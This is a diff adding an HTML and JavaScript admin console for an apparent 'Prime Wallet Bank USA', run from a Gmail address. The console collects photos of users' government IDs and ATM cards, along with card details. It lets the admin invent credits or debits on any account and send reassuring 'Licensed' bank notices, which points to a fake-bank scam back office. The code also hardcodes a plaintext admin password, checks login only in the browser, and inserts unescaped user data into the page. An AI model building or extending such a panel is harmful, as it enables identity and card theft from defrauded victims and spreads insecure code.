@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prime Wallet Bank — Admin Console</title>
+  <style>
+    :root{--pri:#0047AB;--pri-hover:#003380;--white:#FFFFFF;--gold:#B8860B;--danger:#DC2626;--success:#10B981;--bg:#F8FAFC;--border:#E2E8F0;--text:#1E293B}
+    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,Roboto,sans-serif}
+    body{background:var(--bg);color:var(--text)}
+    .hide{display:none!important}
+    .admin-header{background:var(--pri);color:white;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:12px}
+    .brand{font-weight:700;font-size:18px}
+    .login-box{max-width:420px;margin:100px auto;background:white;padding:32px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
+    .container{max-width:1200px;margin:0 auto;padding:24px}
+    input,select,textarea{width:100%;padding:12px;border:1px solid var(--border);border-radius:6px;margin:8px 0 16px;font-size:15px}
+    button{padding:12px 20px;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:15px}
+    .btn-primary{background:var(--pri);color:white}
+    .btn-primary:hover{background:var(--pri-hover)}
+    .btn-success{background:var(--success);color:white}
+    .btn-danger{background:var(--danger);color:white}
+    .btn-gold{background:var(--gold);color:white}
+    .btn-sm{padding:6px 12px;font-size:13px;margin:2px}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px;margin:24px 0}
+    .card{background:white;padding:20px;border-radius:10px;border:1px solid var(--border);margin-bottom:20px}
+    .stat-card{background:linear-gradient(135deg,#0047AB,#1E40AF);color:white;padding:20px;border-radius:10px}
+    .stat-num{font-size:32px;font-weight:700;margin-top:8px}
+    table{width:100%;border-collapse:collapse;background:white;border-radius:10px;overflow:hidden;margin-top:16px}
+    th,td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--border);font-size:14px}
+    th{background:#F1F5F9;font-weight:600}
+    tr:hover{background:#F8FAFC}
+    .badge{padding:4px 10px;border-radius:20px;font-size:12px;font-weight:600}
+    .badge-pending{background:#FEF3C7;color:#92400E}
+    .badge-approved{background:#D1FAE5;color:#065F46}
+    .badge-rejected{background:#FEE2E2;color:#991B1B}
+    .tabs{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
+    .tab{padding:10px 16px;background:white;border:1px solid var(--border);border-radius:6px;cursor:pointer}
+    .tab.active{background:var(--pri);color:white;border-color:var(--pri)}
+    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);align-items:center;justify-content:center;padding:20px;overflow-y:auto}
+    .modal-content{background:white;padding:28px;border-radius:12px;max-width:600px;width:100%;max-height:90vh;overflow-y:auto}
+    .doc-preview{max-width:120px;border:1px solid #ddd;border-radius:6px;padding:6px;background:#f9f9f9}
+    .doc-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0}
+    .alert-box{padding:12px;border-radius:6px;margin:12px 0}
+    .alert-info{background:#E0F2FE;color:#0C4A6E;border:1px solid #BAE6FD}
+    .alert-success{background:#D1FAE5;color:#065F46;border:1px solid #A7F3D0}
+    .alert-danger{background:#FEE2E2;color:#991B1B;border:1px solid #FECACA}
+    .hidden{display:none!important}
+  </style>
+</head>
+<body>
+
+<!-- 🔐 ADMIN LOGIN -->
+<div id="loginPage">
+  <div class="login-box">
+    <h2 style="text-align:center;margin-bottom:24px;color:#0047AB">🏦 Prime Wallet Bank — Admin Console</h2>
+    <label>Admin Email</label>
+    <input type="email" id="adminEmail" placeholder="••••••••@gmail.com">
+    <label>Password</label>
+    <input type="password" id="adminPass" placeholder="••••••••">
+    <button class="btn-primary" style="width:100%" onclick="adminLogin()">🔐 Sign In</button>
+    <p style="text-align:center;margin-top:16px;font-size:12px;color:#666">Restricted Access Only — Prime Wallet Bank USA 🇺🇸</p>
+  </div>
+</div>
+
+<!-- 📊 ADMIN DASHBOARD -->
+<div id="adminPage" class="hidden">
+  <header class="admin-header">
+    <div class="brand">🏦 Prime Wallet Bank — ADMIN CONSOLE 🇺🇸</div>
+    <div>
+      <span id="adminDisplay">••••••••@gmail.com</span>
+      <button style="margin-left:12px;background:rgba(255,255,255,.2);color:white;padding:6px 12px" onclick="adminLogout()">Logout</button>
+    </div>
+  </header>
+
+  <div class="container">
+    <!-- 📈 STATS -->
+    <div class="grid">
+      <div class="stat-card"><p>Total Users</p><p class="stat-num" id="totalUsers">0</p></div>
+      <div class="stat-card" style="background:linear-gradient(135deg,#B8860B,#DAA520)"><p>Pending Approval</p><p class="stat-num" id="pendingCount">0</p></div>
+      <div class="stat-card" style="background:linear-gradient(135deg,#10B981,#059669)"><p>Total System Balance</p><p class="stat-num">$<span id="totalBalance">0.00</span></p></div>
+      <div class="stat-card" style="background:linear-gradient(135deg,#DC2626,#B91C1C)"><p>Pending Tx</p><p class="stat-num" id="pendingTx">0</p></div>
+    </div>
+
+    <!-- 📑 TABS -->
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('pending')">⏳ Pending Approval</div>
+      <div class="tab" onclick="switchTab('users')">👤 All Users</div>
+      <div class="tab" onclick="switchTab('documents')">📄 Documents/IDs</div>
+      <div class="tab" onclick="switchTab('funding')">💰 Fund/Deduct</div>
+      <div class="tab" onclick="switchTab('transactions')">📊 Transactions</div>
+      <div class="tab" onclick="switchTab('notifications')">🔔 Notifications</div>
+    </div>
+
+    <!-- ⏳ PENDING APPROVALS -->
+    <div id="tab-pending">
+      <div class="card">
+        <h3>Registration & Card Purchase — Pending Approval</h3>
+        <p style="color:#666;margin:8px 0">Users CANNOT transact until approved. Review documents → Approve or Reject.</p>
+      </div>
+      <table>
+        <thead><tr><th>User</th><th>Email</th><th>Type</th><th>Submitted</th><th>Status</th><th>Actions</th></tr></thead>
+        <tbody id="pendingTable"></tbody>
+      </table>
+    </div>
+
+    <!-- 👤 ALL USERS -->
+    <div id="tab-users" class="hidden">
+      <h3>All Registered Users</h3>
+      <table>
+        <thead><tr><th>Name</th><th>Email</th><th>Account #</th><th>Balance</th><th>Card Status</th><th>Reg Status</th><th>Actions</th></tr></thead>
+        <tbody id="usersTable"></tbody>
+      </table>
+    </div>
+
+    <!-- 📄 DOCUMENTS & IDs -->
+    <div id="tab-documents" class="hidden">
+      <div class="card">
+        <h3>📄 Uploaded Documents — Government ID & ATM Card</h3>
+        <p style="color:#666;margin:8px 0">View & verify all uploaded documents. Front & Back of ID + ATM Card.</p>
+      </div>
+      <div id="docsList"></div>
+    </div>
+
+    <!-- 💰 FUND / DEDUCT -->
+    <div id="tab-funding" class="hidden">
+      <div class="card">
+        <h3>💰 Credit / Debit User Account</h3>
+        <label>Select User</label>
+        <select id="fundUser"><option value="">-- Select User --</option></select>
+        <label>Amount (USD)</label>
+        <input type="number" id="fundAmount" step="0.01" min="0.01" placeholder="0.00">
+        <label>Transaction Type</label>
+        <select id="fundType">
+          <option value="credit">✅ CREDIT — Add Funds</option>
+          <option value="debit">❌ DEBIT — Subtract Funds</option>
+        </select>
+        <label>Reference / Note</label>
+        <input type="text" id="fundNote" placeholder="e.g. Deposit, Fee Adjustment, etc.">
+        <label>🔔 Send Notification To User</label>
+        <select id="notifyPref">
+          <option value="both">📧 Email + 📱 SMS — Send Both</option>
+          <option value="email">📧 Email Only</option>
+          <option value="sms">📱 SMS Only</option>
+          <option value="none">🔕 No Notification</option>
+        </select>
+        <div style="display:flex;gap:12px;margin-top:20px">
+          <button class="btn-success" onclick="processFunding()">✅ PROCESS & SEND</button>
+          <button class="btn-gold" onclick="previewNotify()">👁️ Preview Notification</button>
+        </div>
+      </div>
+      <h3 style="margin-top:32px">Recent Activity</h3>
+      <div id="fundHistory"></div>
+    </div>
+
+    <!-- 📊 TRANSACTIONS -->
+    <div id="tab-transactions" class="hidden">
+      <h3>All Transactions — Pending & Approved</h3>
+      <table>
+        <thead><tr><th>Date</th><th>User</th><th>Type</th><th>Amount</th><th>Status</th><th>Approved By</th><th>Actions</th></tr></thead>
+        <tbody id="txTable"></tbody>
+      </table>
+    </div>
+
+    <!-- 🔔 NOTIFICATIONS -->
+    <div id="tab-notifications" class="hidden">
+      <h3>🔔 All Sent Notifications (Email & SMS)</h3>
+      <table>
+        <thead><tr><th>Time</th><th>Recipient</th><th>Channel</th><th>Message</th><th>Status</th></tr></thead>
+        <tbody id="notifTable"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- 📄 VIEW DOCUMENT MODAL -->
+<div class="modal" id="docModal">
+  <div class="modal-content">
+    <h3 id="docUserTitle">Documents — User Name</h3>
+    <div id="docContent"></div>
+    <div style="display:flex;gap:12px;margin-top:20px">
+      <button class="btn-success" onclick="approveFromModal()">✅ Approve User</button>
+      <button class="btn-danger" onclick="rejectFromModal()">❌ Reject</button>
+      <button onclick="closeModal()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- 📩 NOTIFICATION PREVIEW MODAL -->
+<div class="modal" id="notifModal">
+  <div class="modal-content">
+    <h3>📩 Notification Preview</h3>
+    <div id="notifPreview" style="background:#F8FAFC;padding:16px;border-radius:8px;margin:16px 0;white-space:pre-wrap;font-family:monospace;font-size:13px"></div>
+    <button onclick="closeModal()">Close</button>
+  </div>
+</div>
+
+<script>
+// ==================================================
+// 🔐 ADMIN LOGIN
+// ==================================================
+const API_URL = "https://prime-wallet-api.onrender.com/api";
+const ADMIN_EMAIL = "primewalletbankusa@gmail.com";
+const ADMIN_PASS = "Princelv1993$";
+
+let adminToken = localStorage.getItem("admin_token");
+let users = JSON.parse(localStorage.getItem("admin_users") || "[]");
+let pending = JSON.parse(localStorage.getItem("admin_pending") || "[]");
+let transactions = JSON.parse(localStorage.getItem("admin_tx") || "[]");
+let notifications = JSON.parse(localStorage.getItem("admin_notif") || "[]");
+let currentViewingUser = null;
+
+// --- LOGIN ---
+function adminLogin() {
+  const e = document.getElementById("adminEmail").value.trim();
+  const p = document.getElementById("adminPass").value;
+  if (e === ADMIN_EMAIL && p === ADMIN_PASS) {
+    adminToken = "admin_" + Date.now();
+    localStorage.setItem("admin_token", adminToken);
+    document.getElementById("adminDisplay").textContent = e.replace(/(.{3}).*(@.*)/, "$1•••••••$2");
+    showAdmin();
+  } else {
+    alert("❌ Invalid Admin Credentials — Access Denied");
+  }
+}
+function adminLogout() {
+  localStorage.removeItem("admin_token");
+  adminToken = null;
+  document.getElementById("loginPage").classList.remove("hidden");
+  document.getElementById("adminPage").classList.add("hidden");
+}
+function showAdmin() {
+  document.getElementById("loginPage").classList.add("hidden");
+  document.getElementById("adminPage").classList.remove("hidden");
+  loadAllData();
+}
+if (adminToken) showAdmin();
+
+// ==================================================
+// 📊 LOAD ALL DATA
+// ==================================================
+function loadAllData() {
+  // Update Stats
+  document.getElementById("totalUsers").textContent = users.length;
+  document.getElementById("pendingCount").textContent = pending.length;
+  document.getElementById("totalBalance").textContent = users.reduce((s,u)=>s+(u.balance||0),0).toFixed(2);
+  document.getElementById("pendingTx").textContent = transactions.filter(t=>t.status==="pending").length;
+
+  // Render Pending Table
+  renderPending();
+  renderUsers();
+  renderDocuments();
+  renderTransactions();
+  renderNotifications();
+  updateFundUserSelect();
+}
+
+// ==================================================
+// ⏳ PENDING APPROVALS
+// ==================================================
+function renderPending() {
+  const t = document.getElementById("pendingTable");
+  if (!pending.length) {
+    t.innerHTML = "<tr><td colspan='5' style='text-align:center;color:#666;padding:20px'>No pending approvals ✅</td></tr>";
+    return;
+  }
+  t.innerHTML = pending.map((item,i) => `
+    <tr>
+      <td><strong>${item.full_name || 'Unnamed'}</strong></td>
+      <td>${item.email}</td>
+      <td><span class="badge ${item.type==='card'?'badge-pending':'badge-approved'}">${item.type==='card'?'💳 Card Purchase':'📋 Registration'}</span></td>
+      <td>${new Date(item.submitted_at).toLocaleString()}</td>
+      <td><span class="badge badge-pending">⏳ Pending</span></td>
+      <td>
+        <button class="btn-sm btn-primary" onclick="viewUserDocs(${i})">📄 View Docs</button>
+        <button class="btn-sm btn-success" onclick="approveItem(${i})">✅ Approve</button>
+        <button class="btn-sm btn-danger" onclick="rejectItem(${i})">❌ Reject</button>
+      </td>
+    </tr>
+  `).join("");
+}
+
+// ==================================================
+// 👤 ALL USERS
+// ==================================================
+function renderUsers() {
+  const t = document.getElementById("usersTable");
+  if (!users.length) {
+    t.innerHTML = "<tr><td colspan='7' style='text-align:center;color:#666;padding:20px'>No registered users yet</td></tr>";
+    return;
+  }
+  t.innerHTML = users.map((u,i) => `
+    <tr>
+      <td><strong>${u.full_name}</strong></td>
+      <td>${u.email}</td>
+      <td>${u.account_number || '—'}</td>
+      <td>$${(u.balance||0).toFixed(2)}</td>
+      <td><span class="badge ${u.card_approved?'badge-approved':'badge-pending'}">${u.card_approved?'✅ Approved':'⏳ Pending'}</span></td>
+      <td><span class="badge ${u.reg_approved?'badge-approved':'badge-pending'}">${u.reg_approved?'✅ Approved':'⏳ Pending'}</span></td>
+      <td>
+        <button class="btn-sm btn-primary" onclick="viewUser(${i})">👁️ View</button>
+        <button class="btn-sm btn-success" onclick="quickApprove(${i})">✓ Approve</button>
+      </td>
+    </tr>
+  `).join("");
+}
+
+// ==================================================
+// 📄 DOCUMENTS & IDs
+// ==================================================
+function renderDocuments() {
+  const list = document.getElementById("docsList");
+  const withDocs = pending.filter(p => p.id_front || p.id_back || p.atm_front || p.atm_back);
+  if (!withDocs.length) {
+    list.innerHTML = "<div class='alert-box alert-info'>📋 No documents uploaded yet. Users must upload Government ID & ATM Card during registration/card purchase.</div>";
+    return;
+  }
+  list.innerHTML = withDocs.map((item,i) => `
+    <div class="card">
+      <h4>${item.full_name} — ${item.email}</h4>
+      <div class="doc-grid">
+        <div>
+          <p><strong>🪪 Govt ID — Front</strong></p>
+          ${item.id_front ? `<img src="${item.id_front}" class="doc-preview" alt="ID Front">` : '<p style="color:red">❌ Not Uploaded</p>'}
+        </div>
+        <div>
+          <p><strong>🪪 Govt ID — Back</strong></p>
+          ${item.id_back ? `<img src="${item.id_back}" class="doc-preview" alt="ID Back">` : '<p style="color:red">❌ Not Uploaded</p>'}
+        </div>
+        <div>
+          <p><strong>💳 ATM Card — Front</strong></p>
+          ${item.atm_front ? `<img src="${item.atm_front}" class="doc-preview" alt="ATM Front">` : '<p style="color:red">❌ Not Uploaded</p>'}
+        </div>
+        <div>
+          <p><strong>💳 ATM Card — Back</strong></p>
+          ${item.atm_back ? `<img src="${item.atm_back}" class="doc-preview" alt="ATM Back">` : '<p style="color:red">❌ Not Uploaded</p>'}
+        </div>
+      </div>
+      <p><strong>📍 Location:</strong> ${item.country || ''} — ${item.state || ''} — ${item.city || ''}</p>
+      <p><strong>📱 Phone:</strong> ${item.phone || '—'}</p>
+      <p><strong>💳 Card Details:</strong> **** **** **** ${item.card_last4 || '----'} | Exp: ${item.expiry || '----'}</p>
+      <div style="margin-top:12px">
+        <button class="btn-sm btn-success" onclick="approveItem(${pending.indexOf(item)})">✅ Approve & Activate</button>
+        <button class="btn-sm btn-danger" onclick="rejectItem(${pending.indexOf(item)})">❌ Reject</button>
+      </div>
+    </div>
+  `).join("");
+}
+
+// ==================================================
+// 💰 FUND / DEDUCT USER
+// ==================================================
+function updateFundUserSelect() {
+  const sel = document.getElementById("fundUser");
+  sel.innerHTML = `<option value="">-- Select User --</option>` +
+    users.map((u,i) => `<option value="${i}">${u.full_name} — ${u.email} — $${(u.balance||0).toFixed(2)}</option>`).join("");
+}
+
+function processFunding() {
+  const idx = parseInt(document.getElementById("fundUser").value);
+  const amount = parseFloat(document.getElementById("fundAmount").value);
+  const type = document.getElementById("fundType").value;
+  const note = document.getElementById("fundNote").value || "Admin adjustment";
+  const notifyPref = document.getElementById("notifyPref").value;
+
+  if (isNaN(idx) || isNaN(amount) || amount <= 0) return alert("⚠️ Select user & enter valid amount.");
+
+  const user = users[idx];
+  const oldBal = user.balance || 0;
+  if (type === "debit" && amount > oldBal) return alert(`⚠️ Insufficient balance. User has $${oldBal.toFixed(2)}`);
+
+  // Update balance
+  user.balance = type === "credit" ? oldBal + amount : oldBal - amount;
+
+  // Record transaction
+  const tx = {
+    id: Date.now(),
+    user_idx: idx,
+    user_name: user.full_name,
+    user_email: user.email,
+    type: type,
+    amount: amount,
+    note: note,
+    old_balance: oldBal,
+    new_balance: user.balance,
+    status: "completed",
+    approved_by: "Admin",
+    created_at: new Date().toISOString()
+  };
+  transactions.unshift(tx);
+
+  // Send notification
+  const action = type === "credit" ? "✅ CREDIT — Funds Received" : "❌ DEBIT — Funds Deducted";
+  const dir = type === "credit" ? "+" : "-";
+  const msg = `
+══════════════════════════
+${action}
+══════════════════════════
+Account: ${user.full_name}
+Amount: ${dir}$${amount.toFixed(2)}
+Date: ${new Date().toLocaleString()}
+Note: ${note}
+New Balance: $${user.balance.toFixed(2)}
+══════════════════════════
+Prime Wallet Bank — USA 🇺🇸
+Secure · Licensed · Protected
+  `.trim();
+
+  if (notifyPref !== "none") {
+    const channels = notifyPref === "both" ? ["📧 Email", "📱 SMS"] : [notifyPref === "email" ? "📧 Email" : "📱 SMS"];
+    channels.forEach(ch => {
+      notifications.unshift({
+        time: new Date().toISOString(),
+        recipient: `${user.full_name} <${user.email}>`,
+        channel: ch,
+        message: msg,
+        status: "✅ Sent"
+      });
+    });
+  }
+
+  // Save & refresh
+  saveAll();
+  alert(`✅ SUCCESS!\n\n${user.full_name}\n${dir}$${amount.toFixed(2)}\nBalance: $${user.balance.toFixed(2)}\n\nNotification sent: ${notifyPref}`);
+  loadAllData();
+}
+
+function previewNotify() {
+  const idx = parseInt(document.getElementById("fundUser").value);
+  const amount = document.getElementById("fundAmount").value || "0.00";
+  const type = document.getElementById("fundType").value;
+  const note = document.getElementById("fundNote").value || "Admin adjustment";
+  if (isNaN(idx)) return alert("Select a user first.");
+  const user = users[idx];
+  const action = type === "credit" ? "✅ CREDIT — Funds Received" : "❌ DEBIT — Funds Deducted";
+  const dir = type === "credit" ? "+" : "-";
+  document.getElementById("notifPreview").textContent = `
+══════════════════════════
+${action}
+══════════════════════════
+Account: ${user.full_name}
+Amount: ${dir}$${amount}
+Date: ${new Date().toLocaleString()}
+Note: ${note}
+Expected New Balance: $${(type==="credit"?(user.balance||0)+parseFloat(amount):Math.max(0,(user.balance||0)-parseFloat(amount))).toFixed(2)}
+══════════════════════════
+Prime Wallet Bank — USA 🇺🇸
+  `.trim();
+  document.getElementById("notifModal").style.display = "flex";
+}
+
+// ==================================================
+// ✅ APPROVE / ❌ REJECT
+// ==================================================
+function approveItem(idx) {
+  const item = pending[idx];
+  item.status = "approved";
+  item.reg_approved = true;
+  item.card_approved = item.type === "card" ? true : item.card_approved;
+  item.balance = item.balance || 0;
+  
+  // Move to users if not exists
+  const existing = users.findIndex(u => u.email === item.email);
+  if (existing >= 0) {
+    users[existing] = { ...users[existing], ...item };
+  } else {
+    users.push(item);
+  }
+
+  // Send approval notification
+  notifications.unshift({
+    time: new Date().toISOString(),
+    recipient: `${item.full_name} <${item.email}>`,
+    channel: "📧 Email",
+    message: `✅ APPROVAL NOTIFICATION\n\nDear ${item.full_name},\nYour ${item.type === 'card' ? 'Card Purchase & Wallet Activation' : 'Registration'} has been APPROVED ✅\n\nYou can now fully transact with Prime Wallet Bank — USA 🇺🇸\n\nThank you for choosing us!`,
+    status: "✅ Sent"
+  });
+
+  pending.splice(idx, 1);
+  saveAll();
+  alert(`✅ ${item.full_name} — APPROVED & ACTIVATED!\nNotification sent to user.`);
+  loadAllData();
+}
+
+function rejectItem(idx) {
+  const item = pending[idx];
+  if (!confirm(`❌ Reject ${item.full_name} (${item.email})?\nUser will be notified.`)) return;
+  
+  notifications.unshift({
+    time: new Date().toISOString(),
+    recipient: `${item.full_name} <${item.email}>`,
+    channel: "📧 Email",
+    message: `⚠️ UPDATE — Prime Wallet Bank\n\nDear ${item.full_name},\n\nWe regret to inform you that your ${item.type === 'card' ? 'card purchase' : 'registration'} could not be approved at this time.\n\nReason: Documents or information did not meet verification requirements.\n\nPlease re-submit with clear, valid documents.\n\n— Prime Wallet Bank — USA 🇺🇸`,
+    status: "✅ Sent"
+  });
+
+  pending.splice(idx, 1);
+  saveAll();
+  alert(`❌ Rejected — User notified via Email.`);
+  loadAllData();
+}
+
+function quickApprove(idx) {
+  users[idx].reg_approved = true;
+  users[idx].card_approved = true;
+  saveAll();
+  alert(`✅ ${users[idx].full_name} — Fully Approved & Activated!`);
+  loadAllData();
+}
+
+// ==================================================
+// 📊 TRANSACTIONS & NOTIFICATIONS
+// ==================================================
+function renderTransactions() {
+  const t = document.getElementById("txTable");
+  if (!transactions.length) {
+    t.innerHTML = "<tr><td colspan='6' style='text-align:center;color:#666;padding:20px'>No transactions yet</td></tr>";
+    return;
+  }
+  t.innerHTML = transactions.map(tx => `
+    <tr>
+      <td>${new Date(tx.created_at).toLocaleString()}</td>
+      <td>${tx.user_name}</td>
+      <td>${tx.type === 'credit' ? '✅ Credit' : '❌ Debit'}</td>
+      <td>${tx.type === 'credit' ? '+' : '-'}$${tx.amount.toFixed(2)}</td>
+      <td><span class="badge badge-approved">${tx.status}</span></td>
+      <td>${tx.approved_by || '—'}</td>
+    </tr>
+  `).join("");
+}
+
+function renderNotifications() {
+  const t = document.getElementById("notifTable");
+  if (!notifications.length) {
+    t.innerHTML = "<tr><td colspan='5' style='text-align:center;color:#666;padding:20px'>No notifications sent yet</td></tr>";
+    return;
+  }
+  t.innerHTML = notifications.slice(0,100).map(n => `
+    <tr>
+      <td>${new Date(n.time).toLocaleString()}</td>
+      <td>${n.recipient}</td>
+      <td>${n.channel}</td>
+      <td style="max-width:250px;overflow:hidden;text-overflow:ellipsis">${n.message.slice(0,50)}...</td>
+      <td><span class="badge badge-approved">${n.status}</span></td>
+    </tr>
+  `).join("");
+}
+
+// ==================================================
+// 🔧 UTILITIES
+// ==================================================
+function switchTab(name) {
+  document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
+  event.target.classList.add("active");
+  document.querySelectorAll("[id^='tab-']").forEach(t => t.classList.add("hidden"));
+  document.getElementById(`tab-${name}`).classList.remove("hidden");
+}
+
+function viewUserDocs(idx) {
+  currentViewingUser = idx;
+  const item = pending[idx];
+  document.getElementById("docUserTitle").textContent = `📄 Documents — ${item.full_name}`;
+  document.getElementById("docContent").innerHTML = `
+    <div class="doc-grid">
+      <div><p><strong>🪪 Govt ID — Front</strong></p>${item.id_front ? `<img src="${item.id_front}" style="max-width:100%">` : '<p style="color:red">❌ Not Uploaded</p>'}</div>
+      <div><p><strong>🪪 Govt ID — Back</strong></p>${item.id_back ? `<img src="${item.id_back}" style="max-width:100%">` : '<p style="color:red">❌ Not Uploaded</p>'}</div>
+      <div><p><strong>💳 ATM Card — Front</strong></p>${item.atm_front ? `<img src="${item.atm_front}" style="max-width:100%">` : '<p style="color:red">❌ Not Uploaded</p>'}</div>
+      <div><p><strong>💳 ATM Card — Back</strong></p>${item.atm_back ? `<img src="${item.atm_back}" style="max-width:100%">` : '<p style="color:red">❌ Not Uploaded</p>'}</div>
+    </div>
+    <p><strong>Email:</strong> ${item.email}</p>
+    <p><strong>Phone:</strong> ${item.phone || '—'}</p>
+    <p><strong>Country/State/City:</strong> ${item.country || '—'} / ${item.state || '—'} / ${item.city || '—'}</p>
+    <p><strong>Card #:</strong> **** **** **** ${item.card_last4 || '----'} | Expiry: ${item.expiry || '----'}</p>
+  `;
+  document.getElementById("docModal").style.display = "flex";
+}
+
+function approveFromModal() { closeModal(); approveItem(currentViewingUser); }
+function rejectFromModal() { closeModal(); rejectItem(currentViewingUser); }
+function closeModal() {
+  document.querySelectorAll(".modal").forEach(m => m.style.display = "none");
+}
+
+function saveAll() {
+  localStorage.setItem("admin_users", JSON.stringify(users));
+  localStorage.setItem("admin_pending", JSON.stringify(pending));
+  localStorage.setItem("admin_tx", JSON.stringify(transactions));
+  localStorage.setItem("admin_notif", JSON.stringify(notifications));
+}
+
+// --- Receive data from user site ---
+window.addEventListener('message', function(e) {
+  if (e.data.type === 'NEW_REGISTRATION' || e.data.type === 'NEW_CARD_PURCHASE') {
+    pending.unshift({
+      ...e.data,
+      submitted_at: new Date().toISOString(),
+      status: 'pending'
+    });
+    saveAll();
+    loadAllData();
+    alert(`🔔 NEW SUBMISSION: ${e.data.full_name} — ${e.data.type === 'NEW_REGISTRATION' ? 'Registration' : 'Card Purchase'}`);
+  }
+});
+</script>
+</body>
+</html>
